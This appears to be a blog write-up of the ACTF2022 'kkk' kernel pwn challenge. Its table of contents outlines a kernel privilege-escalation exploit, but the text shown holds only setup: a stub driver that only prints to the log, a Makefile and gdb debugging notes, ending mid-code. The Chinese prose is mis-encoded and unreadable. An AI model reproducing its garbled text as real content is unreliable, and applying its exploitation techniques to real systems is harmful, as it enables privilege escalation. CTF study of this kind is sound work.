<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>ACTF2022 kkk èµ›åå¤ç° - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="ACTF2022 kkk èµ›åå¤ç°" />
<meta property="og:description" content="
        
            Info
        
        
            Yet another signin (kernel) pwn challenge. 4 Solved
        
    
æ„Ÿè°¢ Nu1L å’Œ AAA çš„å‡ ä½å¸ˆå‚…åˆ†äº«æ€è·¯ã€‚" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://xidoo.top/2022/07/actf2022-kkk/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-17T12:03:19+08:00" />
<meta property="article:modified_time" content="2022-07-17T12:03:19+08:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://xidoo.top/logo.png"/>

<meta name="twitter:title" content="ACTF2022 kkk èµ›åå¤ç°"/>
<meta name="twitter:description" content="
        
            Info
        
        
            Yet another signin (kernel) pwn challenge. 4 Solved
        
    
æ„Ÿè°¢ Nu1L å’Œ AAA çš„å‡ ä½å¸ˆå‚…åˆ†äº«æ€è·¯ã€‚"/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2022/07/actf2022-kkk/" /><link rel="prev" href="http://xidoo.top/2022/01/afl-rsc4/" /><link rel="next" href="http://xidoo.top/2023/05/rev_main/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "ACTF2022 kkk èµ›åå¤ç°",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/xidoo.top\/2022\/07\/actf2022-kkk\/"
        },"genre": "posts","wordcount":  7297 ,
        "url": "http:\/\/xidoo.top\/2022\/07\/actf2022-kkk\/","datePublished": "2022-07-17T12:03:19+08:00","dateModified": "2022-07-17T12:03:19+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "x1do0"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Stay Hungry">ğŸš© Stay hungry</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Stay Hungry">ğŸš© Stay hungry</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">ACTF2022 kkk èµ›åå¤ç°</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-07-17">2022-07-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;7297 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;35 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#preparation">Preparation</a></li>
    <li><a href="#step1">step1</a>
      <ul>
        <li><a href="#åè®®é€†å‘">åè®®é€†å‘</a>
          <ul>
            <li><a href="#packet_hdr">packet_hdr</a></li>
            <li><a href="#segment_hdr">segment_hdr</a></li>
            <li><a href="#segment">segment</a></li>
          </ul>
        </li>
        <li><a href="#demo">demo</a></li>
        <li><a href="#æ¼æ´">æ¼æ´</a></li>
        <li><a href="#åˆ©ç”¨">åˆ©ç”¨</a></li>
      </ul>
    </li>
    <li><a href="#step2">step2</a>
      <ul>
        <li><a href="#é©±åŠ¨é€†å‘">é©±åŠ¨é€†å‘</a>
          <ul>
            <li><a href="#open">open</a></li>
            <li><a href="#close">close</a></li>
            <li><a href="#0x6b64-add">0x6B64 add</a></li>
            <li><a href="#0x6b67-update">0x6B67 update</a></li>
            <li><a href="#0x6b69-dump">0x6B69 dump</a></li>
            <li><a href="#0x6b6b-launch">0x6B6B launch</a></li>
            <li><a href="#0x6b6d-detach">0x6B6D detach</a></li>
          </ul>
        </li>
        <li><a href="#åŠ å¯†å‡½æ•°">åŠ å¯†å‡½æ•°</a></li>
        <li><a href="#æµ‹è¯•">æµ‹è¯•</a></li>
        <li><a href="#åˆ©ç”¨-1">åˆ©ç”¨</a>
          <ul>
            <li><a href="#fork--zero-cred">fork &amp; zero <code>cred</code></a></li>
            <li><a href="#çˆ†ç ´å†…æ ¸ä»£ç æ®µåœ°å€">çˆ†ç ´å†…æ ¸ä»£ç æ®µåœ°å€</a></li>
            <li><a href="#æ³„éœ²å†…æ ¸ä»£ç æ®µåœ°å€">æ³„éœ²å†…æ ¸ä»£ç æ®µåœ°å€</a></li>
            <li><a href="#privilege-escalation">privilege escalation</a></li>
            <li><a href="#ä¿®æ”¹-exp">ä¿®æ”¹ exp</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#step-3">step 3</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw"></i>Info<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Yet another signin (kernel) pwn challenge. <strong>4 Solved</strong></div>
        </div>
    </div>
<p>æ„Ÿè°¢ Nu1L å’Œ AAA çš„å‡ ä½å¸ˆå‚…åˆ†äº«æ€è·¯ã€‚</p>
<h2 id="preparation">Preparation</h2>
<p>ä¸çŸ¥é“æ€ä¹ˆè°ƒ qemu-system å†…è·‘çš„ç”¨æˆ·æ€ç¨‹åºã€‚æ˜æ˜ qemu-system ä¸åƒ qemu-user ä¸€æ ·ä¸ elf å…¬ç”¨åŒä¸€ç‰‡å†…å­˜ï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆ parser åŠ è½½åœ°å€å¯¹ä¸ä¸Šã€‚</p>
<blockquote>
<p>å»ºè®® host è°ƒè¯•,ä¸ç„¶åªèƒ½ä¸‹ç»å¯¹åœ°å€æ–­ç‚¹ã€‚</p>
</blockquote>
<p>å°è¯•ç›´æ¥åœ¨ host é‡Œè°ƒã€‚kkk.ko ä¸æœ¬æœº kernel ç‰ˆæœ¬ä¸åŒï¼Œä¸èƒ½ç›´æ¥æŒ‚ä¸Šæ¥ã€‚æ‰€ä»¥è‡ªå·±é€ ä¸€ä¸ª fake module</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/timer.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/workqueue.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/crypto.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/mutex.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;linux/spinlock.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/scatterlist.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="c1">// #define DEBUG
</span><span class="c1"></span>
<span class="cm">/* ioctl commands */</span>
<span class="cp">#define KKK_IOCTL_ADD _IO(&#39;k&#39;, 100)
</span><span class="cp">#define KKK_IOCTL_UPDATE _IO(&#39;k&#39;, 103)
</span><span class="cp">#define KKK_IOCTL_DUMP _IO(&#39;k&#39;, 105)
</span><span class="cp">#define KKK_IOCTL_LAUNCH _IO(&#39;k&#39;, 107)
</span><span class="cp">#define KKK_IOCTL_DETACH _IO(&#39;k&#39;, 109)
</span><span class="cp"></span>


<span class="cm">/* empty handler, we just need ioctl */</span>
<span class="k">static</span> <span class="kt">int</span>
<span class="nf">kkk_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inodep</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_open()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">kkk_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inodep</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_close()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">kkk_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
                         <span class="n">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_write()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">kkk_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span>
                        <span class="n">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_read()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">kkk_internal_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">&#34;kkk_internal_ioctl()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_ADD</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_UPDATE</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_UPDATE</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_DUMP</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_DUMP</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_LAUNCH</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_LAUNCH</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">case</span> <span class="nl">KKK_IOCTL_DETACH</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_DETACH</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">default</span><span class="o">:</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">&#34;Wrong choice</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">kkk_unlocked_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">kkk_internal_ioctl</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">kkk_compat_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">kkk_internal_ioctl</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">kkk_fops</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
    <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">kkk_write</span><span class="p">,</span>
    <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">kkk_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">kkk_open</span><span class="p">,</span>
    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">kkk_close</span><span class="p">,</span>
    <span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">kkk_unlocked_ioctl</span><span class="p">,</span>
    <span class="p">.</span><span class="n">compat_ioctl</span> <span class="o">=</span> <span class="n">kkk_compat_ioctl</span><span class="p">,</span>
    <span class="p">.</span><span class="n">llseek</span> <span class="o">=</span> <span class="n">no_llseek</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">kkk_device</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
    <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;kkk&#34;</span><span class="p">,</span>
    <span class="p">.</span><span class="n">fops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">kkk_fops</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">kkk_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">error</span><span class="p">;</span>

    <span class="n">error</span> <span class="o">=</span> <span class="n">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kkk_device</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">pr_err</span><span class="p">(</span><span class="s">&#34;misc_register fail</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">error</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">kkk_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kkk_device</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">kkk_init</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">kkk_exit</span><span class="p">);</span>

<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;kkk fake driver&#34;</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;x1do0&#34;</span><span class="p">);</span>
<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>é©±åŠ¨çš„ Makefile ç”¨æœ€åŸºç¡€çš„å°±è¡Œã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="err">ifneq</span> <span class="err">(</span><span class="k">$(</span><span class="nv">KERNELRELEASE</span><span class="k">)</span><span class="err">,)</span>
<span class="nv">obj-m</span><span class="o">:=</span>kkk.o
<span class="err">else</span>
<span class="nv">KDIR</span> <span class="o">:=</span>/lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build
<span class="nv">PWD</span> <span class="o">:=</span><span class="k">$(</span>shell <span class="nb">pwd</span><span class="k">)</span>
<span class="nf">all</span><span class="o">:</span>
	make -C <span class="k">$(</span>KDIR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
<span class="nf">clean</span><span class="o">:</span>
	rm -f *.ko *.o *.mod.o *.symvers *.cmd *.mod.c *.order
<span class="err">endif</span>
</code></pre></td></tr></table>
</div>
</div><p>make ä»¥å insmod æŒ‚ä¸Šæ¥å°±èƒ½è·‘ or è°ƒè¯• parser äº†ã€‚</p>
<p>è¿› su ä»¥å python ç¯å¢ƒä¼šå˜ï¼Œæ·»åŠ  sys.path æ‰è¡Œï¼Œä¸ç„¶ pwntools åº“éƒ½æ‰¾ä¸åˆ°ï¼Œå‚è€ƒ<a href="https://askubuntu.com/questions/1268870/python-module-not-found-in-sudo-mode-ubuntu-20-04" target="_blank" rel="noopener noreffer">è¿™ç¯‡</a>ã€‚</p>
<p>è¿› su ä»¥åç›´æ¥åœ¨è„šæœ¬é‡Œ gdb.attach ä¼šæŒ‚ä¸ä¸Š gdbï¼Œæç¤º ptrace not permittedã€‚å‚è€ƒ<a href="https://stackoverflow.com/questions/19215177/how-to-solve-ptrace-operation-not-permitted-when-trying-to-attach-gdb-to-a-pro" target="_blank" rel="noopener noreffer">è¿™ç¯‡</a>ï¼Œå°è¯•è¿‡æ”¹ <code>/proc/sys/kernel/yama/ptrace_scope</code> ä¹Ÿä¸è¡Œã€‚ã€‚</p>
<p>åªæœ‰å…ˆè·‘è„šæœ¬ï¼Œå†å¼€ä¸€ä¸ª suï¼Œç„¶å gdb attach pid æŒ‚ä¸Šå»ã€‚ã€‚åœ¨ exp ä¸­å†™ä¸ªç­‰å¾…ç”¨æˆ·è¾“å…¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">###</span>
<span class="nb">input</span><span class="p">()</span> <span class="c1"># wait for input, attach gdb at this time</span>
<span class="c1">###</span>
</code></pre></td></tr></table>
</div>
</div><p>ç„¶åä¹˜æœºè·‘ <code>debug.sh [pid]</code>ï¼ŒæŒ‚ä¸Š gdbã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
